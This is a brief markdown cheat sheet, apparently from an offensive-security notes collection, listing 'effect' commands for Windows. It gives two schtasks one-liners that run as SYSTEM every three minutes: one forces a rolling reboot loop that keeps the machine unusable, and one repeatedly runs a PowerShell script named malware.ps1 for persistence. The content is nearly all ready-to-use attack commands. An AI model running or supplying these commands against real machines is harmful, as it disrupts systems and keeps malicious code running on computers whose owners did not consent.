<p align="right">
  <a href="/README.md">Home Page</a> |
  <a href="/CheatSheets/effect.md#table-of-contents">Top of Page</a> |
  <a href="/CheatSheets/effect.md#run-a-script">Bottom of Page</a>
</p>

# Cheatsheets - Effect
## Table of Contents
* [Scheduled Tasks](#scheduled-tasks)
  * [Rolling Reboot](#rolling-reboot) 
  * [Run a Script](#run-a-script)

## Scheduled Tasks
### Rolling Reboot
```bash
schtasks.exe /create /ru "SYSTEM" /sc minute /mo 3 /tn "Rolling Reboot" /tr "shutdown /r /t 000" 
```

### Run a Script
```bash
schtasks.exe /create /ru "SYSTEM" /sc minute /mo 3 /tn "Run a Script" /tr "powershell -c 'C:\malware.ps1'" 
```
